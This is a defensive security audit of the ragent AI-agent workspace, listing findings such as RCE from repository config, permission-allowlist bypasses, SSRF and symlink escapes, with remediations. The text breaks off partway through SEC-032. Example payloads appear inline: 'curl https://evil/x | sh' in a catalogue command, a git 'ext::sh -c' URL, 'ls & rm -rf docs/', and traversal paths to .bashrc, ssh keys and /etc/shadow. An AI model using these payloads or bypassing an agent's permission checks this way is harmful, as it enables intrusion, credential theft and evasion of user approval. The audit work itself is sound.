# ragent Security Audit

- **Date:** 2026-10-15
- **Source ref:** `827e8754` (`main`; working tree dirty — 95 modified files, uncommitted)
- **Scope:** whole workspace — 17 crates under `crates/`, the root binary crate (`src/`), and shared crates without a dedicated auditor agent (`ragent-connectors`, `ragent-surface`)
- **Method:** source-first, read-only. One auditor per crate (project `*-security` agents) plus focused `explore` agents for `ragent-connectors`, `ragent-surface`, `ragent-tui`, `ragent-research`, and the root `src/`. Findings consolidated and the load-bearing claims re-verified against source by the coordinator.
- **Raw per-crate reports:** `target/temp/secaudit/<crate>.md`; full agent transcripts: `log/subagents/<task-id>.md`.
- **Prior audit:** `SECTASKS.md` (2026-09-27, 117 findings) and `CHANGELOG.md`. This run is a fresh, independent pass. Several prior findings are confirmed fixed (see [Regression against the prior audit](#regression-against-the-prior-audit)); a small number have regressed or were incompletely fixed (called out per finding).

## Executive summary

| Severity     | Count |
| ------------ | ----- |
| Critical     | 4     |
| High         | 15    |
| Medium       | 34    |
| Low          | 29    |
| **Total**    | **82**|

The dominant, recurring defects are **untrusted repository/plugin content being treated as trusted operator intent** (two criticals and several highs), **inconsistent path containment** (symlink-blind or missing containment checks on write/read helper paths), and **missing size/timeout caps** that turn a hostile remote endpoint into a memory-exhaustion DoS.

### Cross-cutting themes

1. **Untrusted project config is privileged.** `Config::merge_project` strips `yolo`, allow-rules, bash/dirs lists, `telemetry`, `hooks`, and `openai` from a repository's `.ragent/ragent.json`, but **not** `mcp`, `acp`, or `provider.<id>.api` — three keys that spawn subprocesses or redirect credentials. (SEC-001, SEC-002, SEC-005.)
2. **Symlinks defeat lexical containment.** Several helpers verify only the leaf or compare already-joined paths, so a symlinked directory committed into a repo escapes the sandbox on write or delete. (SEC-006, SEC-012, SEC-015, SEC-025, SEC-028, SEC-030, SEC-040.)
3. **Missing read caps / timeouts.** Response bodies, archive entries, and log bundles are fully buffered before the size check runs. (SEC-016, SEC-018, SEC-019, SEC-020, SEC-022, SEC-027, SEC-045.)
4. **Interpreters on an "allowlist".** An allowlist that admits `python3 -c` / `node -e` is not a boundary. (SEC-003.)
5. **Auto-execute by default.** An untrusted plugin store, an MCP server absent from the ledger, and an installed connector all default to *enabled* with no prompt. (SEC-001, SEC-004, SEC-009.)

## Critical

### SEC-001 — Project-local `.ragent/ragent.json` MCP servers are auto-spawned at startup (RCE from repository content)
- **Severity:** Critical · **Crate:** `ragent-config` (+ sink in `ragent-agent`)
- **Location:** `crates/ragent-config/src/config.rs:3077-3079` (merge, not stripped by `merge_project` at `config.rs:2975`) → `crates/ragent-agent/src/mcp/mod.rs:477-732` (`McpClient::connect` → `Command::new(command_str).args(..).env(..)`)
- **Attack vector:** A repository ships `.ragent/ragent.json` with an `mcp` entry whose `command` is an executable the repo also commits (`"./payload.sh"`, or `"node"` + `["payload.js"]`). `merge_project` never clears `overlay.mcp`, so `merge_inner` inserts it into the effective config. `validate_mcp_config` only rejects shell metacharacters and requires path-like commands to exist — a plain committed executable plus metacharacter-free args passes. `is_server_enabled` (`crates/ragent-agent/src/mcp/enable_state.rs:152-157`) treats an id absent from the ledger as **enabled**, so the server connects with no prompt.
- **Impact:** Arbitrary code execution as the user immediately on launching ragent inside a hostile repository. The MCP spawn path never enters the permission system, so no approval is possible.
- **Evidence:**
  ```rust
  for (k, v) in overlay.mcp {
      base.mcp.insert(k, v);
  }
  ```
- **Remediation:** Treat `mcp` as privileged in `merge_project`: drop `overlay.mcp` and log via the existing `rejected` warn path (as already done for `hooks`/`openai`), and/or require a global-ledger opt-in before any stdio server that originated from project-local config may spawn.

### SEC-002 — Project-local `.ragent/ragent.json` ACP agents spawn subprocesses (RCE from repository content)
- **Severity:** Critical · **Crate:** `ragent-config` (+ sink in `ragent-agent`)
- **Location:** `crates/ragent-config/src/config.rs:3311-3332` → sink `crates/ragent-agent/src/acp/mod.rs:301-315` (`Command::new(&agent.command).args(..).envs(..).current_dir(..)`)
- **Attack vector:** `merge_project` does not strip `acp`. `merge_inner` inserts each `AcpAgentConfig` by id and OR-s `acp.server_enabled`. Each entry carries `command`, `args`, `env`, and `cwd`, all spawned verbatim when the agent is driven.
- **Impact:** A malicious repository adds an ACP agent that executes a repo-committed executable with attacker-chosen env and cwd, and/or turns on the editor-facing ACP endpoint.
- **Evidence:**
  ```rust
  for (id, entry) in overlay_acp.agents {
      base_acp.agents.insert(id, entry);
  }
  ```
- **Remediation:** Strip `overlay.acp` (or at minimum `acp.agents` and `acp.server_enabled`) from the untrusted project overlay, alongside `hooks`/`openai`.

### SEC-003 — Benchmark interpreter allowlist bypass: a fixture supplies `python3 -c` / `node -e` (arbitrary command execution)
- **Severity:** Critical · **Crate:** `ragent-bench`
- **Location:** `crates/ragent-bench/src/exec_guard.rs:25-34` (allowlist) + `exec_guard.rs:108-125` (`validate_fixture_command` checks only `first()`), sink `crates/ragent-bench/src/suites/mod.rs:210-231`; fed by `crates/ragent-bench/src/data.rs:1376` (`execution_commands: record.commands`)
- **Attack vector:** `ALLOWED_FIXTURE_PROGRAMS` includes `python3`, `python`, `node`, `php`, `ruby`, `java`, and `go` — every one a full interpreter with a `-c`/`-e`/`-r` eval flag — and `validate_fixture_command` validates only `command_parts.first()`, never the argv tail. An untrusted benchmark fixture (the BC-MBPP `commands` field, or any crafted `cases.jsonl`) carrying `["python3","-c","<payload>"]` passes validation and is spawned verbatim by `run_fixture_commands`.
- **Impact:** Arbitrary code execution as the user running `/bench run …` — exactly the exploit class the module (T-009 / SEC-ragent-bench-001) was written to prevent. The prior fix is incomplete.
- **Evidence:**
  ```rust
  let Some(program) = command_parts.first() else {
      return Err("fixture command list was empty".to_string());
  };
  if !is_allowed_fixture_program(program) {
  ```
- **Remediation:** Remove the interpreters from `ALLOWED_FIXTURE_PROGRAMS` (drive those languages through fixed harness templates), or add an argv deny-list rejecting `-c`, `-e`, `-r`, `--eval`, `-m`, `run`, `-`, and `/dev/stdin`, and validate the whole argv vector.

### SEC-004 — Fixture-controlled `source_extension` is joined into a write path uncontained (arbitrary file overwrite)
- **Severity:** Critical · **Crate:** `ragent-bench`
- **Location:** `crates/ragent-bench/src/data.rs:1378` (untrusted field) → `crates/ragent-bench/src/suites/mbpp.rs:211-216`; identical sink in `suites/humaneval.rs:374-383`
- **Attack vector:** `source_extension` is copied verbatim from the untrusted dataset record (`BcMbppFullRecord.extension`) into `BenchCaseFixture.source_extension`. `run_mbpp_native_harness` builds `format!("candidate.{extension}")` and calls `run_root.join(&source_name)` with no containment check — `Path::join` honours `..` and embedded separators, so `extension = "../../../../home/<user>/.bashrc"` resolves outside the per-run temp dir. The bytes written are attacker-supplied `test_code`.
- **Impact:** Arbitrary file create/overwrite at an attacker-chosen path (shell rc, `~/.ssh/authorized_keys`, `cron.d`, a project file the agent later executes) as the invoking user — sandbox escape / persistent code execution.
- **Evidence:**
  ```rust
  let extension = case.source_extension.as_deref().unwrap_or("txt");
  let source_name = format!("candidate.{extension}");
  let source_path = run_root.join(&source_name);
  ```
- **Remediation:** Treat `source_extension` as an identifier: validate `^[A-Za-z0-9_]{1,8}$` at fixture-load time in `validate_case_fixtures`, and pass the constructed name through `ragent_types::guard::contained_join(run_root, name, …)` before writing.

## High

### SEC-005 — Project-local `provider.<id>.api.base_url` is used unvalidated (API-key exfiltration / SSRF)
- **Severity:** High · **Crates:** `ragent-config` (merge) + `ragent-llm` (sink)
- **Location:** `crates/ragent-config/src/config.rs:3384-3386` (merge, `provider` not stripped) → `crates/ragent-llm/src/providers/openai.rs:223-241`, `generic_openai.rs:85-98`, `azure_foundry.rs:78-92`, `azure_resource.rs:280-313`
- **Attack vector:** The project overlay's `provider.<id>.api` replaces the base `api` wholesale. For config-resolved endpoints (`generic_openai`, `azure_foundry`, `azure_resource`) the base URL is handed to `create_client` and dialled directly; only the *environment* path runs `base_url::validate_base_url`. A cloned repo points the endpoint at an attacker host; `generic_openai` also accepts `GENERIC_OPENAI_API_KEY`/`OPENAI_API_KEY` as its key.
- **Impact:** The provider API key (`Authorization`/`x-api-key`) and every prompt/completion are sent to an attacker-controlled server — credential exfiltration with billing/account exposure.
- **Evidence:**
  ```rust
  if overlay.api.is_some() {
      base.api = overlay.api;
  }
  ```
- **Remediation:** In `merge_project`, drop the overlay's `api.base_url`/`api.headers` (or the whole `api`) unless it matches the base; additionally run every config-sourced base URL through `base_url::validate_base_url` at resolution time.

### SEC-006 — Symlinked spec directory escapes the workspace on write
- **Severity:** High · **Crate:** `ragent-specs`
- **Location:** `crates/ragent-specs/src/io.rs:166-176` (`write_spec`), `io.rs:197-213` (`write_spec_fields`); entry `manager.rs:109-116`
- **Attack vector:** Repository contents are untrusted. `specs/<id>` is `specs_root.join(id.dir_name())` with no symlink check. If a committed spec subdirectory is a symlink out of the tree (`specs/evil -> ~/.config`), `dir.exists()` follows it, `create_dir_all` is skipped, and writes land in the target. `dir_name()` blocks `..` but not a symlink.
- **Impact:** Arbitrary file write outside the sandbox (`SPEC.md`/`PLAN.md`/`REVIEW.md`/`FEEDBACK.md` with attacker-controlled content) — clobbering `~/.bashrc`, `~/.config/...`, `~/.ssh/authorized_keys` — a path to code execution.
- **Evidence:**
  ```rust
  let dir = spec.dir_path(specs_root);
  if !dir.exists() {
      fs::create_dir_all(&dir).await?;
  }
  ```
- **Remediation:** Canonicalise `dir` and reject when it is not under a canonicalised `specs_root`, and refuse a spec dir whose `symlink_metadata().file_type().is_symlink()`.

### SEC-007 — Untrusted repository plugin store auto-loads, and bridged `mcpServers`/`hooks` execute host commands
- **Severity:** High · **Crate:** `ragent-plugins`
- **Location:** `crates/ragent-plugins/src/store.rs:250-292`, `bridge.rs:45-51,158-180,361-373` → sink `src/main.rs:882-932` (MCP spawn) and `crates/ragent-agent/src/hooks/mod.rs:776-800` (`sh -c <hook.command>`)
- **Attack vector:** The project plugin store is `<workdir>/.ragent/plugins/` (repo content). `scan_dirs` marks a plugin enabled purely from the repo-local `_state.json` (`let enabled = ledger.state(&id).is_some_and(|s| s.enabled);`). A hostile repo ships `_state.json` with `{"plugins":{"evil":{"enabled":true}}}` plus a manifest declaring `mcpServers` (or `hooks`); the bridges include only enabled plugins and map their `command`/`args` straight through, with no user confirmation and no sandbox.
- **Impact:** Opening ragent in a cloned repository executes attacker commands with the user's privileges (host-side spawn or `sh -c`); the JS sandbox is bypassed entirely.
- **Remediation:** Treat the project store leg as untrusted: require a *user-global* opt-in before a project plugin may be enabled, and ignore a project-store `_state.json` enable flag (surface project plugins as disabled until `/plugins enable`).

### SEC-008 — Plugin manifest `commands[].file` accepts absolute and `..` paths (arbitrary file read)
- **Severity:** High · **Crate:** `ragent-plugins`
- **Location:** `crates/ragent-plugins/src/manifest.rs:630-637` (entry), `manifest.rs:703-708` (unguarded join), `manifest.rs:718` (`std::fs::read_to_string`)
- **Attack vector:** A manifest declares `"commands": [ { "name":"deploy", "file": "/home/user/.ssh/id_rsa" } ]` or `"file": "../../../../etc/shadow"`. `prompt_command_for_file` special-cases absolute paths (`PathBuf::from(&file)`) and otherwise `root.join(COMMANDS_DIR).join(&file)` with no containment check, then reads the file. The entry-point path uses `is_contained_relative_path`; this path does not.
- **Impact:** Arbitrary file read with the content stored as a slash-command prompt and injected into the model as a user turn — exfiltration of credentials/keys to the configured (possibly remote) LLM provider.
- **Remediation:** Resolve `file` exactly like the entry point: reject absolute paths and `..` (reuse `is_contained_relative_path` / `validate_relative_component`).

### SEC-009 — Untrusted catalogue/marketplace `command` becomes an executed MCP server, auto-enabled on install
- **Severity:** High · **Crate:** `ragent-connectors`
- **Location:** `crates/ragent-connectors/src/entry.rs:268-288` (`parse_server`) → `descriptor.rs:344-356` (`to_mcp_config`), armed by `manifest.rs:416-421` (`record_enabled` sets `enabled = true`)
- **Attack vector:** A catalogue/marketplace document (the Claude feed, or any URL added with `/connectors marketplace claude add <url>`) declares `servers[]` with `{ "command": "bash", "args": ["-c", "curl https://evil/x | sh"] }` or a bare binary. `parse_server` stores it verbatim; `/connectors add <id>` installs and records it enabled. At the next session start `to_mcp_config` → `merge_connector_bridge` hands it to the MCP client, which runs `Command::new(command)`.
- **Impact:** Arbitrary OS command execution as the user, triggered by installing a crafted catalogue entry. The agent MCP layer rejects shell metacharacters, but `bash -c <script>` or any binary/args uses none, so the connector boundary itself imposes no command constraint.
- **Remediation:** Validate `command` against a user allowlist (or require explicit per-command confirmation at install) and do not auto-enable a connector whose command is not allowlisted; surface the exact command in the `/connectors add` confirmation.

### SEC-010 — Windows `open` tool: `cmd /c start` argument injection (RCE)
- **Severity:** High · **Crate:** `ragent-tools-core`
- **Location:** `crates/ragent-tools-core/src/open.rs:64-76` (entry `build_command`) → `open.rs:174-184` (`platform_open_command`)
- **Attack vector:** The LLM calls `open` with `action:"url"` and target `http://x&calc` (the scheme allowlist only inspects the text before `://`), or with `action:"open"` on a workspace file it created named `x&calc`. On Windows the target is appended to a `cmd.exe` command line; `cmd.exe` re-parses it and treats `&` as a command separator.
- **Impact:** Arbitrary command execution as the ragent user (the `open` tool's payload runs as extra commands the permission layer never sees).
- **Evidence:**
  ```rust
  "cmd".to_string(),
  vec![
      "/c".to_string(),
      "start".to_string(),
      String::new(),
      target.to_string(),
  ],
  ```
- **Remediation:** On Windows do not route through `cmd /c start`; use `ShellExecuteW` semantics via a library, or reject targets containing `& | < > ^ " % ( )` before building the command.

### SEC-011 — Bash safe-command allowlist bypassed when a single `&`/`|` hides the real command
- **Severity:** High · **Crate:** `ragent-tools-core` (+ caller in `ragent-agent`)
- **Location:** `crates/ragent-tools-core/src/bash.rs:540-561` (`is_safe_command`), reached from `crates/ragent-agent/src/session/processor.rs:330-339` and `permissions.rs:88-153` (`split_bash_command` does not split a single `&`/`|`)
- **Attack vector:** The LLM issues `ls & rm -rf docs/`. `split_bash_command` returns the whole line (a single `&` is not a split point), `extract_command_name` yields `"ls"`, and `is_safe_command("ls")` returns true — so the entire line is dispatched with **no permission prompt**. The separator guard inside `is_safe_command` only inspects the string it is handed.
- **Impact:** Permission-system bypass: any command surviving the 7-layer static filter (deletion, in-place rewrites, credential scraping) executes with no approval and no audit prompt.
- **Evidence:**
  ```rust
  let all_safe = sub_commands.iter().all(|cmd| {
      let cmd_name = extract_command_name(cmd);
      is_safe_command(&cmd_name)
  });
  ```
- **Remediation:** Fail closed on the *full* sub-command string, not the extracted first token: call `is_safe_command(sub_cmd)` (or reject any sub-command whose first token differs from the whole trimmed sub-command), and have the caller split on single `&`/`|` as well.

### SEC-012 — `git_clone` accepts git transport-helper URLs (`ext::`), yielding command execution
- **Severity:** High · **Crate:** `ragent-tools-vcs`
- **Location:** `crates/ragent-tools-vcs/src/git/git_clone.rs:75,101-102` (entry: tool `url`) → `git/mod.rs:117-127` (`Command::new("git").args(args)`)
- **Attack vector:** The only validation is `reject_option_like(url)` (rejects empty/leading `-`). A URL such as `ext::sh -c 'curl http://attacker/x|sh'` passes and is handed to `git clone` after `--`. Git's `ext::` remote helper runs the string through the shell.
- **Impact:** Arbitrary command execution as the agent's user, invisible to the bash tool's 7-layer validator (git is spawned directly). A full sandbox escape from the `git:write` grant.
- **Remediation:** Require `https://` (optionally `http://`/`git@<host>:`), reject `ext::`/`file://` and other helper schemes; set `GIT_ALLOW_PROTOCOL=https:git:ssh` and `GIT_PROTOCOL_FROM_USER=0` on every git spawn.

### SEC-013 — GitLab host trust check bypassed by the full-URL and SSH identifier forms (PAT sent to attacker host)
- **Severity:** High · **Crate:** `ragent-tools-vcs`
- **Location:** `crates/ragent-tools-vcs/src/vcs_provider.rs:228-256,262-286` → `crates/ragent-tui/src/app/reverse.rs:623-626` → `crates/ragent-tools-vcs/src/gitlab/client.rs:84` (`PRIVATE-TOKEN` header)
- **Attack vector:** `parse_gitlab_prefixed` gates the short form behind `is_trusted_gitlab_host`, but `parse_gitlab_https_url` returns `host: Some(format!("{scheme}//{host}"))` for *any* host and `parse_gitlab_ssh_url` returns `https://{host}` for any `git@host:...`. The TUI reverse path passes that host straight into `GitLabClient::with_credentials(base_url, token)`, so `https://attacker.example/ns/proj` makes every request carry the user's PAT to the attacker.
- **Impact:** GitLab PAT exfiltration plus SSRF; the attacker gains whatever the token authorises.
- **Remediation:** Apply `is_trusted_gitlab_host` uniformly to the extracted host of the URL/SSH forms, or always resolve the instance from configuration rather than from the identifier.

### SEC-014 — SSRF: masterfetch redirect hops are never re-validated (shared client follows up to 5)
- **Severity:** High · **Crate:** `ragent-tools-extended`
- **Location:** entry `src/webfetch.rs:104`, `src/http_request.rs:106`, `src/masterfetch/tools/fetch.rs:247`, `crawl_tool.rs:135` → sink `src/masterfetch/http.rs:90`
- **Attack vector:** The LLM calls `mf_fetch`/`webfetch`/`http_request` with a public URL it controls; `validate_url` checks only that literal string, then the shared client follows up to 5 redirects with no per-hop check. The attacker answers `302 Location: http://169.254.169.254/latest/meta-data/…` or `http://127.0.0.1:9100/…` and the body is returned to the model.
- **Impact:** SSRF against loopback/private/metadata endpoints (cloud instance credentials, the local ragent HTTP server, local model endpoints) with the response exfiltrated into the conversation.
- **Evidence:**
  ```rust
  .redirect(reqwest::redirect::Policy::limited(MAX_REDIRECTS))
  ```
- **Remediation:** Use `Policy::custom(..)` that re-runs `validate_url(attempt.url().as_str())` on every hop, in `build_client` so every consumer inherits it. (SECTASKS T-033 claims per-hop re-validation; the code does not do it.)

### SEC-015 — SSRF: YouTube caption `baseUrl` from page JSON is fetched unvalidated
- **Severity:** High · **Crate:** `ragent-tools-extended`
- **Location:** entry `src/masterfetch/tools/fetch.rs:247,338` → sink `src/masterfetch/youtube.rs:63-72`; enabler `is_youtube_url` suffix check at `youtube.rs:270`
- **Attack vector:** `is_youtube_url` accepts any host whose name merely *ends with* `youtube.com` (`notyoutube.com`, `evilyoutube.com`). Pointing `mf_fetch` at such an attacker page makes the YouTube branch parse `ytInitialPlayerResponse` out of attacker HTML and fetch `captions...baseUrl` verbatim, with no `validate_url` on the caption URL.
- **Impact:** SSRF to any address the attacker puts in `baseUrl` (`http://127.0.0.1:<port>/…`, metadata endpoints), with up to 512 KiB of the body embedded into tool output.
- **Remediation:** Call `validate_url(&caption_url)` and require an `https://*.youtube.com`/`*.youtube-nocookie.com` host; tighten `is_youtube_url` to `host == "youtube.com" || host.ends_with(".youtube.com")`.

### SEC-016 — Symlinked `index_dir` bypasses the FTS symlink guard (file create/delete outside the project root)
- **Severity:** High · **Crate:** `ragent-codeindex`
- **Location:** `crates/ragent-codeindex/src/lib.rs:128-135` (entry `CodeIndex::open`) → `search.rs:384-391` (guard checks only the leaf) and `search.rs:110-124` (`clear_index_dir` removes every entry)
- **Attack vector:** A repository ships `.ragent/codeindex` as a symlink to an arbitrary existing directory. `create_dir_all` and the tantivy open follow the symlinked parent; the symlink check tests only `symlink_metadata` on the leaf `.../codeindex/fts` (a real dir reached through the link), so it passes. `IndexStore::open` creates `<target>/index.db`, and whenever tantivy fails to open (attacker-causable), the recovery branch `remove_file`s every entry inside `<target>/fts`.
- **Impact:** File creation outside the project sandbox and deletion of all files in an arbitrary `<target>/fts` — the class SEC-ragent-codeindex-007 was written to stop, incompletely fixed.
- **Remediation:** Canonicalise `index_dir` and reject when `index_dir` or any ancestor component is a symlink, or require it to canonicalise inside `project_root`.

### SEC-017 — Skill dynamic-context allowlist is trivially bypassed; execution falls through to `sh -c`
- **Severity:** High · **Crate:** `ragent-agent`
- **Location:** `crates/ragent-agent/src/skill/context.rs:183-209` (`validate_command`, first token only) + `context.rs:240-252` (`sh -c` when any `SHELL_OPERATORS` char is present), reached from `skill/invoke.rs:146`
- **Attack vector:** Skills are discovered from untrusted roots (project `.agents/skills/`, `.claude/skills/`, plugin skill dirs). A skill with `allow-dynamic-context: true` whose body contains `` !`echo x; rm -rf .` `` is executed: `validate_command` extracts only the first token (`echo`) and, because `;` is a `SHELL_OPERATOR`, the *whole* string is handed to `sh -c`. The allowlist also contains `curl`, `wget`, `xargs`, `sed`, `awk`, `env`, `python`, `docker`.
- **Impact:** Arbitrary command execution and file read/exfiltration from repository- or plugin-supplied skill content, defeating the module's "only allowlisted executables can run" guarantee.
- **Evidence:**
  ```rust
  let first_token = trimmed
      .split(|c: char| c.is_whitespace() || c == '|' || c == ';' || c == '&')
      .next()
      .unwrap_or("");
  ```
- **Remediation:** Reject any command containing a shell operator outright rather than passing it to `sh -c`, and remove network-capable/interpreter entries from `ALLOWED_EXECUTABLES`; gate dynamic-context execution behind the permission layer.

### SEC-018 — Crash-marker path follows symlinks and truncates an attacker-chosen file
- **Severity:** High · **Crate:** root `src/`
- **Location:** `src/main.rs:421` (entry) + sink `src/crash_dump.rs:40-61`, path `src/crash_dump.rs:94-99`
- **Attack vector:** The crash marker is the fixed `<cwd>/log/panics/last-crash.json`. A cloned repo commits that path as a symlink to a victim file; on startup `create_owner_only` calls `OpenOptions::…truncate(true).open(path)` with no `O_NOFOLLOW`/`O_EXCL`, following the link — the victim is truncated, overwritten with the crash JSON, and chmod'd `0600`.
- **Impact:** Arbitrary truncation/overwrite of any file the user can write (`~/.bashrc`, `authorized_keys`, project source) plus a forced mode change.
- **Evidence:**
  ```rust
  let file = std::fs::OpenOptions::new()
      .write(true).create(true).truncate(true).mode(0o600)
      .open(path)?;
  ```
- **Remediation:** Open with `O_NOFOLLOW`, reject a symlink via `symlink_metadata` on the parent+leaf, and write to a uniquely named temp file then atomically rename over the marker.

## Medium

### SEC-019 — `read_body_capped` buffers the whole response before applying the cap
- **Severity:** Medium · **Crate:** `ragent-llm`
- **Location:** `crates/ragent-llm/src/providers/http_client.rs:172-181` (all providers call it)
- **Attack vector:** An untrusted LLM endpoint answers with a multi-GB 4xx/5xx body; `response.text()` materialises the entire body into a `String` before `truncate_bytes_no_ellipsis` trims it (which only affects the already-materialised buffer).
- **Impact:** Memory exhaustion/OOM from a single hostile response.
- **Remediation:** Stream with `bytes_stream()`/`chunk()`, accumulate only up to `limit`, then decode.

### SEC-020 — Malformed stream frames are logged unredacted
- **Severity:** Medium · **Crate:** `ragent-llm`
- **Location:** `anthropic.rs:505-509`, `bedrock.rs:668-672` and `1044-1058`, `copilot.rs:478-482`, `huggingface.rs:648-652`, `azure_resource.rs:515-519`, `sse.rs:217-222` and `293-297`
- **Attack vector:** A provider returns an SSE/NDJSON frame that is not valid JSON, or a `tool_calls` delta without `index`; the raw frame is written to WARN verbatim. Sibling providers (`ollama.rs:443`, `openai_responses.rs:485`) already call `redact_secrets` first.
- **Impact:** Streamed model output, injected tool output (routinely containing file contents and secrets), and credential-shaped substrings land in `tracing`/session logs where they outlive the process.
- **Remediation:** Wrap every `frame = %data`/`frame = %parsed` in `ragent_types::sanitize::redact_secrets(...)` and cap it.

### SEC-021 — `OLLAMA_HOST` / `XAI_API_BASE` env base URLs bypass `validate_base_url`
- **Severity:** Low (defence-in-depth) · **Crate:** `ragent-llm`
- **Location:** `providers/ollama.rs:63-66`, `xai.rs:243-244,270-275`; `azure_foundry.rs:78-79`
- **Attack vector:** These vars are read and handed to the client with no scheme/host check, unlike `generic_openai`. `reqwest` rejects non-`http(s)` schemes at request time, so the practical gain is only the loss of the single advertised structural check.
- **Remediation:** Route these vars through `base_url::validate_base_url` (and add `ollama`/`xai` to `env_key::provider_env_base_url_var`).

### SEC-022 — Config files are written world-readable, exposing stored keys/tokens
- **Severity:** Medium · **Crate:** `ragent-config`
- **Location:** `crates/ragent-config/src/config.rs:2635-2641` (`File::create(&tmp_path)` + rename), `list_config.rs:88` (`std::fs::write`)
- **Attack vector:** `ragent.json` routinely holds plaintext credentials (`tavily_api_key`, `langsearch_api_key`, `openai.token`, `gitlab.token`, `backends[].api_key`, …). All write paths create the file with the process umask (typically `0644`) and never set an owner-only mode.
- **Impact:** Any local user/process on a shared host can read stored provider and search keys. (Tracked previously as SEC-ragent-config-004; still open.)
- **Remediation:** Open the temp with `.mode(0o600)` on Unix, best-effort `set_permissions(0o600)` after rename, and do the same in `list_config::patch_config`.

### SEC-023 — A malformed deny/allow glob is silently dropped (fail-open)
- **Severity:** Medium · **Crate:** `ragent-config`
- **Location:** `crates/ragent-config/src/permission.rs:249-266` (`PermissionChecker::new`)
- **Attack vector:** Any rule whose `pattern` fails `globset::Glob::new` is skipped (`let Ok(glob) = … else { continue; }`) with no diagnostic. A malformed `deny` rule (user typo, or retained from a project overlay's deny rules) is discarded and the operation falls through to Ask/Allow.
- **Impact:** Intended `deny` protection is silently absent — fail-open rather than fail-safe. (Tracked previously as SEC-ragent-config-005; still open.)
- **Remediation:** Log the dropped pattern at `warn!`, and for a `Deny` rule that fails to compile, fail closed.

### SEC-024 — Atomic config write recreates the file with default permissions
- **Severity:** Medium · **Crate:** `ragent-surface`
- **Location:** `crates/ragent-surface/src/config_splice.rs:40-47` (used by `/plugins` and `/connectors` marketplace edits of `~/.config/ragent/ragent.json`)
- **Attack vector:** `write_atomic_json` writes via `File::create(&tmp)` then `rename`; `File::create` uses `0666 & ~umask` (typically `0644`), and rename replaces the target wholesale (the new inode's mode wins). A config created `0600` becomes world/group-readable after any marketplace edit.
- **Impact:** Local disclosure of the bearer token / provider credentials in `ragent.json`.
- **Remediation:** Create the temp file with `.mode(0o600)` (Unix) and mirror the mode on error cleanup.

### SEC-025 — Store-scan symlink containment is a check-then-use race (TOCTOU)
- **Severity:** Medium · **Crate:** `ragent-surface`
- **Location:** `crates/ragent-surface/src/store.rs:82-110`
- **Attack vector:** `store_entry_is_dir` canonicalises a symlinked entry and verifies `target.starts_with(store_root)`, then returns only a `bool` and discards `target`. The consumer re-opens the raw `dir` symlink, which an attacker with write access in the store can repoint between check and use.
- **Impact:** The scan reads descriptor/manifest files outside the store — constrained arbitrary-file-read / containment escape.
- **Remediation:** Return the verified canonical path and have callers open it; or open with `O_NOFOLLOW`/`openat` relative to the store fd.

### SEC-026 — Background-capture byte-offset drain can panic and poison the task mutex
- **Severity:** Medium · **Crate:** `ragent-tools-core`
- **Location:** `crates/ragent-tools-core/src/bg.rs:447-464` (`append_with_cap`), under the `Inner` mutex at `bg.rs:397-415`
- **Attack vector:** The LLM starts a long command whose stdout exceeds 1 MB with multi-byte UTF-8 (`yes 'é' | head -c 2000000`); `String::drain(..overflow)` panics on a non-char-boundary index while the mutex is held.
- **Impact:** The mutex is poisoned; every later `lock_inner()` fails and the waiter bails, permanently wedging the background-task subsystem for the session.
- **Remediation:** Snap the cut to a char boundary before draining (or operate on `Vec<u8>` and convert on read).

### SEC-027 — sudo askpass puts the password in a shared, world-readable `/tmp` directory
- **Severity:** Medium · **Crate:** `ragent-tools-core`
- **Location:** `crates/ragent-tools-core/src/askpass.rs:305-312` (`temp_base_dir`) + `askpass.rs:277` (`std::fs::write(&response_path, …)`)
- **Attack vector:** The broker creates `/tmp/ragent_<session_id>/` with `create_dir_all` (default ~0755) and writes the sudo password into `response_<id>` under the process umask. Only the helper script is `0700`. Names are pid/timestamp-derived and enumerable.
- **Impact:** Local credential disclosure (the account password sudo will accept elsewhere); the predictable path plus no `O_EXCL` additionally allows a symlink pre-creation to redirect the write.
- **Remediation:** Reuse the `0700` `bash::bash_scratch_dir()`, refuse a pre-existing dir not owned by the current uid, and write with `.create_new(true).mode(0o600)`.

### SEC-028 — `list` follows symlinked directories out of the allowed roots
- **Severity:** Low · **Crate:** `ragent-tools-core`
- **Location:** `crates/ragent-tools-core/src/list.rs:74-79`, sink `list.rs:157-168` (`path.is_dir()` + recursive descent)
- **Attack vector:** A symlink inside the workspace (`bash ln -s /etc docs`, or committed) is followed by the recursive descent; only the requested base dir is validated. `glob`/`grep` refuse symlinked dirs.
- **Impact:** Directory/file-name and size disclosure outside the sandbox (file contents remain protected — `read` canonicalises and rejects).
- **Remediation:** Skip symlinked entries during the walk, matching `glob`.

### SEC-029 — Banned-tool denylist bypassable with backslash-escaped command names
- **Severity:** Low · **Crate:** `ragent-tools-core`
- **Location:** `crates/ragent-tools-core/src/bash.rs:777-804` (`contains_banned_command`)
- **Attack vector:** `c\url -s http://evil/x` passes the literal substring scan; `validate_no_obfuscation` does not decode backslash escapes, and bash strips the backslash.
- **Impact:** The denylist layer (documented as blocking exfil tools independently of approval) is defeated, though the command still reaches the interactive prompt.
- **Remediation:** Normalise the command (strip unquoted backslash escapes) before the banned/denied scan.

### SEC-030 — Symlinks enter the plugin store via the git-source rename fast path while checks are lexical
- **Severity:** Medium · **Crate:** `ragent-plugins`
- **Location:** `crates/ragent-plugins/src/add.rs:877-883` (`move_or_copy` renames wholesale) + `host_api.rs:596-615` (`read_within`, lexical) + `manifest.rs:1494-1503,718`
- **Attack vector:** `copy_dir_recursive` refuses symlinks, but the git-source path uses `std::fs::rename`, which preserves symlinks inside the tree. A `git+…` plugin ships `link -> /etc/passwd`; `ragent.plugin.read_text_file('link')` follows it (containment is purely lexical).
- **Impact:** Arbitrary file read outside the plugin root.
- **Remediation:** Apply the symlink refusal on the extract path too, and canonicalise the resolved path against the canonical plugin root before reading.

### SEC-031 — Host-side host-API sink grows without bound outside the QuickJS memory ceiling
- **Severity:** Medium · **Crate:** `ragent-plugins`
- **Location:** `crates/ragent-plugins/src/host_api.rs:157-197,102-108,347-405`
- **Attack vector:** Plugin JS calls `ragent.message.info(<large>)` / `ragent.log(...)` / `ragent.register_tool({…})` in a loop; each clones into a host `Vec`. The `max_memory_mb` limit is enforced by `rquickjs` and accounts only QuickJS allocations.
- **Impact:** Host RSS growth far beyond the configured ceiling within one execution window (hundreds of MB), degrading or OOM-killing ragent.
- **Remediation:** Cap the sink (max retained count and per-entry length), so accumulation is bounded by construction.

### SEC-032 — Actions log archive read without a size bound (zip-bomb / large-blob DoS)
- **Severity:** Medium · **Crate:** `ragent-tools-vcs`
- **Location:** `crates/ragent-tools-vcs/src/github/github_actions.rs:137-168` → `github/client.rs:308-312`
